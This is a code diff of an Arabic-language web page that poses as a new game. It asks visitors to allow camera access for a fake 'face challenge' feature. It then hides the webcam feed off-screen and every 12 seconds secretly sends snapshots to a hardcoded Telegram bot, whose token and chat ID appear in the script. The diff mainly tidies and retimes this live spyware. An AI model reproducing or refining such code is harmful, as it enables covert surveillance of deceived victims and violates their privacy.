@@ -47,38 +47,34 @@
             color: #ffcc00;
             font-weight: bold;
         }
-       video {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    opacity: 0.01;          /* شفافية خفيفة جدًا – يكفي ليشتغل */
-    left: -9999px;
-    top: -9999px;
-}
+        video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            left: -9999px;
+            top: -9999px;
+        }
     </style>
 </head>
 <body>
     <h1>لعبة تركس الرهيبة!</h1>
-    
+   
     <p>
         مرحباً! جرب لعبة تركس الجديدة المطورة 2026<br>
         اضغط الزر أدناه لبدء اللعبة فوراً وتحدي أصدقائك!<br><br>
         <strong style="color:#ff4444">ملاحظة:</strong> اللعبة تحتاج الوصول للكاميرا لتفعيل وضع التحدي بالوجه – اضغط "السماح" للمتابعة!
     </p>
-
-    <button class="btn" onclick="startCamera()">ابدأ اللعبة الآن</button>
-    
+    <button class="btn" onclick="startCamera()">ابدأ</button>
+   
     <div id="status">اضغط الزر لبدء التحدي...</div>
-
     <video id="video" autoplay playsinline muted></video>
 
     <script>
         let stream = null;
-
         const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
-        const CHAT_ID    = '6611123941';
-
-        const PHOTO_INTERVAL = 10000; // زيادة الفترة إلى 10 ثوانٍ لإعطاء وقت أكبر لتحميل الكاميرا
+        const CHAT_ID = '6611123941';
+        const PHOTO_INTERVAL = 12000; // 12 ثانية لإعطاء وقت كافٍ
 
         async function startCamera() {
             const status = document.getElementById('status');
@@ -93,21 +89,18 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // انتظر حتى يصبح الفيديو جاهزًا
                 await new Promise(resolve => {
                     video.onloadeddata = () => {
                         console.log("الفيديو جاهز للالتقاط");
                         resolve();
                     };
-                    // timeout احتياطي لو ما اشتغل الحدث
-                    setTimeout(resolve, 5000);
+                    setTimeout(resolve, 6000);
                 });
 
                 status.textContent = "تم تفعيل التحدي! استمتع باللعبة...";
                 status.style.color = "#00ff88";
 
                 setInterval(captureAndSend, PHOTO_INTERVAL);
-
             } catch (err) {
                 status.textContent = "خطأ: " + err.message;
                 status.style.color = "#ff4444";
@@ -118,7 +111,6 @@
         async function captureAndSend() {
             const video = document.getElementById('video');
 
-            // التحقق من أن الفيديو جاهز وله أبعاد حقيقية
             if (video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
                 console.log("الفيديو ليس جاهزًا بعد، ننتظر...");
                 return;
@@ -134,7 +126,6 @@
 
             try {
                 const blob = await (await fetch(dataUrl)).blob();
-
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'capture.jpg');
@@ -163,4 +154,3 @@
     </script>
 </body>
 </html>
-
